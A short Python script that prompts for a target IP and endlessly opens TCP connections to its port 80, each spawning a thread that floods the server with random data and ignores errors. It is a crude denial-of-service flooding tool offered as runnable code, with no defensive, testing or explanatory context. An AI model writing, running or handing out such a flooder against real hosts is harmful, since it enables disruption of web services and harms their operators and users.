import socket
import random
import threading

class Client:
	def __init__(self, ip, port):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect((ip, port))
		iThread = threading.Thread(target=self.handler)
		iThread.daemon = True
		iThread.start()

	def handler(self):
		while True:
			try:
				self.sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
			except:
				pass

if __name__ == '__main__':
	ipthing = input("IP PLES: ")
	loof = []
	while True:
		loof.append(Client(ipthing, 80))
		print("Client Added")
